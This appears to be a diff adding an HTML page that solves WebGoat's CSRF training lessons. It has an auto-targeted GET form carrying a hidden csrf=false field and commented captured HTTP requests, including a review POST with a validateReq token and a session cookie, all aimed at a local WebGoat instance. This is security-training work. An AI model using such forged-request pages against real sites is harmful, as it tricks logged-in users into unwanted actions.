@@ -1,0 +1,32 @@
+<!DOCTYPE HTML>
+<html><body>
+
+<form accept-charset="UNKNOWN" id="basic-csrf-get" method="GET" name="form1" successcallback="" action="http://localhost:8080/WebGoat/csrf/basic-get-flag" enctype="application/json;charset=UTF-8">
+	<!-- <input type="text" name="reviewText"> -->
+	<!-- <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"> -->
+        <input name="csrf" type="hidden" value="false">
+        <input type="submit" name="ubmit=">
+
+    </form>
+<!--
+
+GET /WebGoat/csrf/basic-get-flag?csrf=false&ubmit%3D=Submit HTTP/1.1
+
+POST /WebGoat/csrf/review HTTP/1.1
+Host: localhost:8080
+Content-Length: 70
+Accept: */*
+Origin: http://localhost:8080
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://localhost:8080/WebGoat/start.mvc
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: JSESSIONID=73791AAB1B4C5E5B90A5046263889CCD
+Connection: close
+
+reviewText=dadadad&stars=&validateReq=2aa14227b9a13d0bede0388a7fba9aa9
+
+-->
+</body></html>
